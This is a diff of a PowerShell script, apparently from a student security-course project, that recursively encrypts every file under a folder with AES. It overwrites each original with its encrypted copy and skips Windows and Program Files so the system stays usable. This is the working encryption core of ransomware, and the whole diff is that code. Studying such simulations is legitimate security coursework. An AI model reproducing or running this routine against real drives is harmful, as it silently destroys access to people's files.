@@ -1,26 +1,33 @@
-# Load the single-file encryption function
-. "C:\Path\Protect-AesFile.ps1" 
+#Loads encryption function from the Protect-AesFile
+. "C:\Users\Amna Shahid\github\CSEC-604-Project-Repo\Protect-AesFile.ps1" 
 
-# Define source drive and destination root
-$FilesToEncrypt = "C:\Path\Example_Test_Files"
-$Storage = "C:\Path\Storage" 
+#path to the source file/folder/drive to be encrypted 
+$FilesToEncrypt = "C:\Users\Amna Shahid\github\CSEC-604-Project-Repo\Example_Test_Files"
 
-#exclude critical and useless files from being encrypting so program can run smoothly 
-$ExcludePattern = "^C:\\Windows|^C:\\Program Files|^C:\\Program Files \(x86\)|^C:\\$Recycle.Bin|^C:\\System Volume Information|^C:\\Config.Msi|^C:\\MSOCache|^C:\\hiberfil.sys|^C:\\pagefile.sys|^C:\\swapfile.sys"
+#storage path where encrypted files will be stored temporarily 
+$Storage = "C:\Users\Amna Shahid\github\CSEC-604-Project-Repo\Storage" 
 
-# Use Get-ChildItem and filter out system paths before processing
+#exclude critical files from encrypting so program can run smoothly and the machine isn't damaged 
+$ExcludePattern = "^C:\\Windows|^C:\\Program Files|^C:\\Program Files \(x86\)"
+
+#Gets each object from the path given by using a for loop and recursion is used to reach all files if needed 
+#errors (mainly access based) are ignored so the program can run smoothly 
 Get-ChildItem -Path $FilesToEncrypt -File -Recurse -Force -ErrorAction SilentlyContinue | 
     Where-Object { $_.FullName -notmatch $ExcludePattern } | 
     ForEach-Object {
+        #creates storage file 
+        New-Item -Path $Storage -ItemType Directory -Force | Out-Null
+
         # Calculate new path, preserving folder structure in the output folder 
         $relativePath = $_.FullName.Substring($FilesToEncrypt.Length)
-        $newFilePath   = Join-Path -Path $Storage -ChildPath ($relativePath + ".enc")
-        
-        # Call the existing function Protect-AesFile on each object 
+        $newPath   = Join-Path -Path $Storage -ChildPath ($relativePath + ".enc")
+
+        #Call the encryption function, Protect-AesFile on each object 
+        #Overwrite the contents of the original object with the encrypted contents in the temporary storage file 
         try {
             Write-Host "Encrypting: $($_.FullName)"
-            Protect-AesFile -InFile $_.FullName -OutFile $newFilePath -PasswordFile Password.txt
-            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newFilePath))
+            Protect-AesFile -InFile $_.FullName -OutFile  $newPath -PasswordFile Password.txt
+            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newPath))
         }
         catch {
             Write-Warning "Unable to encrypt: $($_.FullName). Receiving error: $($_.Message)"
